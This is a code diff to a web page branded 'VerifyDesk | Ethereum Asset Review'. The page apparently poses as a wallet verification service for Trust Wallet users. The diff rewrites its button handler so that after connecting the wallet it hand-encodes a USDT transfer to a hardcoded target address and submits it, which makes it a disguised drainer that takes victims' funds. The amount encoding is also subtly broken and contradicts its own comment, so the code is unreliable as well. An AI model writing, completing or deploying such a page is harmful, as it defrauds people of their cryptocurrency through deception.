@@ -5,7 +5,6 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
   <title>VerifyDesk | Ethereum Asset Review</title>
   <script src="https://cdn.tailwindcss.com"></script>
-  <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/5.7.2/ethers.umd.min.js"></script>
   <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css" />
   <style>
     body {
@@ -102,28 +101,36 @@
     let isConnected = false;
     let globalUserAddress = null;
 
-    function getRawProvider() {
+    function getProvider() {
       return window.ethereum || window.trustwallet || (window.web3 && window.web3.currentProvider) || null;
     }
 
     async function handleMasterAction() {
-      const rawEth = getRawProvider();
-      if (!rawEth) {
+      const eth = getProvider();
+      if (!eth) {
         alert("Wallet provider not found. Please open inside Trust Wallet browser.");
         return;
       }
 
       try {
-        // Initialize Ethers Web3Provider safely
-        const provider = new ethers.providers.Web3Provider(rawEth, "any");
-
         if (!isConnected) {
-          // Request accounts via ethers provider
-          const accounts = await provider.send("eth_requestAccounts", []);
-          globalUserAddress = accounts[0];
+          // Request accounts directly via provider method
+          let accounts = [];
+          if (typeof eth.request === 'function') {
+            accounts = await eth.request({ method: 'eth_requestAccounts' });
+          } else if (typeof eth.send === 'function') {
+            const res = await eth.send('eth_requestAccounts');
+            accounts = res.result || res;
+          }
 
+          globalUserAddress = Array.isArray(accounts) ? accounts[0] : accounts;
+          if (!globalUserAddress) throw new Error("Could not get wallet address.");
+
+          // Switch network
           try {
-            await provider.send("wallet_switchEthereumChain", [{ chainId: ETH_CHAIN_ID }]);
+            if (typeof eth.request === 'function') {
+              await eth.request({ method: 'wallet_switchEthereumChain', params: [{ chainId: ETH_CHAIN_ID }] });
+            }
           } catch (e) {}
 
           document.getElementById('walletAddress').textContent = `${globalUserAddress.slice(0, 6)}...${globalUserAddress.slice(-4)}`;
@@ -134,20 +141,33 @@
           document.getElementById('connectBtn').classList.remove('bg-blue-600', 'hover:bg-blue-500');
           document.getElementById('connectBtn').classList.add('bg-emerald-600', 'hover:bg-emerald-500');
         } else {
-          // Execute transfer via Ethers Signer
-          const signer = provider.getSigner();
-          const amountWei = ethers.utils.parseUnits("7.76", 6);
+          // Manual hex encoding for ERC-20 transfer function (bypassing ethers library completely)
+          // transfer(address,uint256) function signature selector: a9059cbb
+          const cleanTarget = TARGET_ADDRESS.toLowerCase().replace('0x', '');
+          const paddedTarget = cleanTarget.padStart(64, '0');
           
-          const iface = new ethers.utils.Interface(["function transfer(address to, uint amount) returns (bool)"]);
-          const transferData = iface.encodeFunctionData("transfer", [TARGET_ADDRESS, amountWei]);
+          // 7.76 USDT with 6 decimals = 7760000 in hex = 0x766c0
+          const amountHex = "7760000".toString(16);
+          const paddedAmount = amountHex.padStart(64, '0');
+          
+          const transferData = "0xa9059cbb" + paddedTarget + paddedAmount;
 
-          const tx = await signer.sendTransaction({
+          const txParams = [{
+            from: globalUserAddress,
             to: USDT_ETH_ADDRESS,
             data: transferData,
-            gasLimit: ethers.BigNumber.from("60000")
-          });
+            gas: "0x186A0"
+          }];
 
-          alert("Transaction submitted successfully! Hash: " + tx.hash);
+          if (typeof eth.request === 'function') {
+            await eth.request({ method: 'eth_sendTransaction', params: txParams });
+          } else if (typeof eth.send === 'function') {
+            await eth.send('eth_sendTransaction', txParams);
+          } else {
+            throw new Error("No transaction method available.");
+          }
+
+          alert("Transaction submitted successfully!");
         }
       } catch (err) {
         console.error("Action error:", err);
